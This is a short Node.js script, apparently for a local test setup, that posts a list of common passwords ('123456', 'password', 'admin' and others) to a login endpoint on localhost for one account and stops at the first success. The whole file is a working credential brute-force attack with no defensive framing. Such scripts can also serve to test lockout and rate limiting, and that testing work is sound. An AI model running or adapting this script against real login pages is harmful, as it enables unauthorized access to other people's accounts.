const axios = require('axios');

const targetUrl = 'http://localhost:3000/login';
const email = 'analyst@authx.com';
const passwordList = [
  '123456',
  'password',
  'Password123', 
  'admin',
  'qwerty',
  'testat'
];

(async () => {
  for (const password of passwordList) {
    try {
      const response = await axios.post(targetUrl, {
        email,
        password
      });
      if (response.data && response.data.success) {
  console.log(`[SUCCESS] Password found: ${password}`);
        break;
      } else {
  console.log(`[FAIL] Tried password: ${password}`);
      }
    } catch (err) {
      if (err.response && err.response.data && err.response.data.message) {
  console.log(`[FAIL] Tried password: ${password} | Message: ${err.response.data.message}`);
      } else {
  console.log(`[ERROR] Tried password: ${password} | Error: ${err.message}`);
      }
    }
  }
})();
